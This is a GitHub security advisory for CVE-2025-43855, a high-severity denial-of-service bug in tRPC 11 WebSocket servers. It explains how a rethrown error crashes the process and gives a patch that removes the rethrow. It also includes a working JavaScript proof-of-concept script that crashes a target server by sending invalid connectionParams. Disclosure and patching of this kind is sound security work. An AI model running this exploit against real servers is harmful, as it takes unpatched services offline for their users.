# [H] tRPC 11 WebSocket DoS Vulnerability

## Summary
Severity: High
Advisory: GHSA-pj3v-9cm8-gvj8
CVE: CVE-2025-43855
CWE: CWE-248, CWE-460
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-04-24
Source: https://github.com/advisories/GHSA-pj3v-9cm8-gvj8
Type: github-advisory

## Affected
- npm: `@trpc/server` — affected >=11.0.0 <11.1.1

## Details
### Summary

An unhandled error is thrown when validating invalid connectionParams which crashes a tRPC WebSocket server. This allows any unauthenticated user to crash a tRPC 11 WebSocket server.

### Details
Any tRPC 11 server with WebSocket enabled with a `createContext` method set is vulnerable. Here is an example:

https://github.com/user-attachments/assets/ce1b2d32-6103-4e54-8446-51535b293b05

I have a working reproduction here if you would like to test: https://github.com/lukechilds/trpc-vuln-reproduction

The connectionParams logic introduced in https://github.com/trpc/trpc/pull/5839 does not safely handle invalid connectionParams objects. During validation if the object does not match an expected shape an error will be thrown:

https://github.com/trpc/trpc/blob/8cef54eaf95d8abc8484fe1d454b6620eeb57f2f/packages/server/src/unstable-core-do-not-import/http/parseConnectionParams.ts#L27-L33

This is called during WebSocket connection setup inside `createCtxPromise()` here:

https://github.com/trpc/trpc/blob/8cef54eaf95d8abc8484fe1d454b6620eeb57f2f/packages/server/src/adapters/ws.ts#L435

`createCtxPromise` has handling to catch any errors and pass them up to the `opts.onError` handler:

https://github.com/trpc/trpc/blob/8cef54eaf95d8abc8484fe1d454b6620eeb57f2f/packages/server/src/adapters/ws.ts#L144-L173

However the error handler then rethrows the error:

https://github.com/trpc/trpc/blob/8cef54eaf95d8abc8484fe1d454b6620eeb57f2f/packages/server/src/adapters/ws.ts#L171

Since this is all triggered from the WebSocket `message` event there is no higher level error handling so this causes an uncaught exception and crashes the server process.

This means any tRPC 11 server with WebSockets enabled can be crashed by an attacker sending an invalid connectionParams object. It doesn't matter if the server doesn't make user of connectionParams, the connectionParams logic can be initiated by the client.

To fix this vulnerability tRPC should not rethrow the error after it's be handled. This patch fixes the vulnerability:

```patch
From 5747b1d11946f60268eb86c59784bd6f7eb50abd Mon Sep 17 00:00:00 2001
From: Luke Childs <lukechilds123@gmail.com>
Date: Sun, 20 Apr 2025 13:27:10 +0700
Subject: [PATCH] Don't throw already handled error

This error has already been handled so no need to re-throw. If we re-throw it will not be caught and will trigger an uncaught exception causing the entire server process to crash.
---
 packages/server/src/adapters/ws.ts | 2 --
 1 file changed, 2 deletions(-)

diff --git a/packages/server/src/adapters/ws.ts b/packages/server/src/adapters/ws.ts
index ad869affd..5a578b5cb 100644
--- a/packages/server/src/adapters/ws.ts
+++ b/packages/server/src/adapters/ws.ts
@@ -167,8 +167,6 @@ export function getWSConnectionHandler<TRouter extends AnyRouter>(
         (globalThis.setImmediate ?? globalThis.setTimeout)(() => {
           client.close();
         });
-
-        throw error;
       });
     }

--
2.48.1

```

## PoC

This script will crash the target tRPC 11 server if WebSockets are enabled:

```js
#!/usr/bin/env node

const TARGET = 'ws://localhost:3000'

// These malicious connection params will crash any tRPC v11.1.0 WebSocket server on validation
const MALICIOUS_CONNECTION_PARAMS = JSON.stringify({
  method: "connectionParams",
  data: { invalidConnectionParams: null },
});

// Open a connection to the target
const target = `${TARGET}?connectionParams=1`;
console.log(`Opening a WebSocket to ${target}`);
const socket = new WebSocket(target);

// Wait for the connection to be established
socket.addEventListener("open", () => {
  console.log("WebSocket established!");

  // Sends a message to the WebSocket server.
  console.log(`Sending malicious connectionParams`);
  socket.send(MALICIOUS_CONNECTION_PARAMS);
  console.log(`Done!`);
});

// Handle errors
socket.addEventListener("error", () => console.log("Error opening WebSocket"));
```

Complete PoC with vulnerable WebSocket server here: https://github.com/lukechilds/trpc-vuln-reproduction

## References
- https://github.com/trpc/trpc/security/advisories/GHSA-pj3v-9cm8-gvj8
- https://nvd.nist.gov/vuln/detail/CVE-2025-43855
- https://github.com/trpc/trpc/pull/5839
- https://github.com/trpc/trpc/commit/9beb26c636d44852e0f407f3d7a82ad54df65b4d
- https://github.com/trpc/trpc
- https://github.com/trpc/trpc/blob/8cef54eaf95d8abc8484fe1d454b6620eeb57f2f/packages/server/src/adapters/ws.ts#L171
